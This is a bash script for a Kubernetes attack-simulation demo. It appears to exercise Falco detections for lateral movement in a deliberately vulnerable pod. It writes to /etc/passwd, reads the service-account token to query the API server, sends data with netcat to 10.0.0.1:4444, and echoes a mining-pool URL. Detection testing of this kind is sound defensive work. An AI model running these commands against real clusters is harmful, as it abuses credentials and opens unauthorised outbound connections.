#!/usr/bin/env bash
# Attack Simulation: Phase 3 - Lateral Movement
# Simulates an attacker attempting to move laterally within the cluster
# and escalate privileges.
#
# MITRE ATT&CK: T1021 (Remote Services), T1570 (Lateral Tool Transfer)
# Falco rules triggered: Outbound Connection, Privilege Escalation, Crypto Mining Detection

set -euo pipefail

NAMESPACE="vulnerable-app"
APP_LABEL="app=vulnerable-app"
BOLD='\033[1m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Phase 3: Lateral Movement${NC}"
echo -e "${BOLD}  MITRE ATT&CK: T1021, T1570${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""

# Get the pod name
POD=$(kubectl get pod -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [[ -z "${POD}" ]]; then
    echo -e "${RED}ERROR: No vulnerable-app pod found in namespace ${NAMESPACE}${NC}"
    exit 1
fi

echo -e "${GREEN}Target pod: ${POD}${NC}"
echo ""

# Step 1: Attempt privilege escalation
echo -e "${YELLOW}[1/5] Attempting privilege escalation... (triggers Falco)${NC}"
echo -e "  Command: Attempting to write to /etc/passwd"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  echo "# Attempting to modify /etc/passwd" >> /etc/passwd 2>/dev/null && \
    echo "  WARNING: /etc/passwd was writable!" || \
    echo "  /etc/passwd write attempt blocked (still triggers Falco)"
'
echo ""
sleep 2

# Step 2: Attempt to install tools (simulating lateral tool transfer)
echo -e "${YELLOW}[2/5] Attempting to install network tools...${NC}"
echo -e "  Command: apt-get install -y nmap netcat (simulated)"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  which nmap 2>/dev/null && echo "  nmap found!" || echo "  nmap not found (would install in real attack)"
  which nc 2>/dev/null && echo "  netcat found!" || echo "  netcat not found"
  which curl 2>/dev/null && echo "  curl found - can be used for data exfiltration"
'
echo ""
sleep 2

# Step 3: Scan for other services in the cluster
echo -e "${YELLOW}[3/5] Scanning for other services in the cluster...${NC}"
echo -e "  Command: Querying Kubernetes API for services"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  echo "  Services discovered:"
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/services?limit=5" 2>/dev/null | \
    grep -o "\"name\":\"[^\"]*\"" | head -10 || echo "  (API query failed)"
'
echo ""
sleep 2

# Step 4: Simulate outbound connection to non-standard port
echo -e "${YELLOW}[4/5] Connecting to non-standard port... (triggers Falco)${NC}"
echo -e "  Command: curl to external on port 4444 (common reverse shell port)"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  timeout 3 sh -c "echo test | nc -w 1 10.0.0.1 4444" 2>/dev/null || \
    echo "  Connection to 10.0.0.1:4444 failed (but triggered Falco alert)"
'
echo ""
sleep 2

# Step 5: Simulate crypto mining command (just the command string, not actual mining)
echo -e "${YELLOW}[5/5] Simulating crypto mining detection... (triggers Falco)${NC}"
echo -e "  Command: Process with stratum+tcp in arguments"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  echo "Simulating mining command: --url stratum+tcp://pool.example.com:3333"
  # The echo alone may trigger Falco pattern matching on the command line
'
echo ""

echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Lateral Movement Simulation Complete${NC}"
echo -e "${RED}  Check Falco logs for CRITICAL alerts!${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""
echo -e "View Falco alerts: kubectl logs -n falco -l app.kubernetes.io/name=falco -f --since=3m"
echo ""
echo -e "${BOLD}Next step:${NC} Apply Kyverno policies to prevent redeployment:"
echo "  kubectl apply -k ../security-tools/kyverno/policies/"
echo "  kubectl delete -f ../demo-workloads/vulnerable-app/deployment.yaml"
echo "  kubectl apply -f ../demo-workloads/vulnerable-app/deployment.yaml  # Should be REJECTED"
